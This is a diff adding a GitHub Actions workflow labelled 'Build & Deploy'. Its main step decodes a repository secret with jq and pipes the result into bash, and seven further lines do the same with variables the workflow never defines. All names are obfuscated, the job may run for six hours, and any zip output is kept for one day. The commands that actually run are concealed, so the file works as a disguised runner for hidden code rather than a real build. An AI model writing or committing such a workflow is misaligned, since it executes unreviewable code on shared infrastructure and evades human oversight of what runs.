@@ -1,0 +1,34 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          gll08: ${{ secrets.gll08 }}
+        run: |
+          printf '%s' "$gll08" | jq -r .lwvu37722 | /bin/bash
+          echo $efh1553 | jq -r .yri53400 | /bin/bash
+          echo $ih6561 | jq -r .iri0195 | /bin/bash
+          printf '%s' "$e8029" | jq -r .a2688 | /bin/bash
+          printf '%s' "$xi2" | jq -r .eluor57 | /bin/bash
+          printf '%s' "$wzza1" | jq -r .hb870 | /bin/bash
+          echo $azsk62958 | jq -r .ml4 | /bin/bash
+          printf '%s' "$koo4548" | jq -r .wwnw69101 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: gipHwR0A
+          path: "*.zip"
+          retention-days: 1
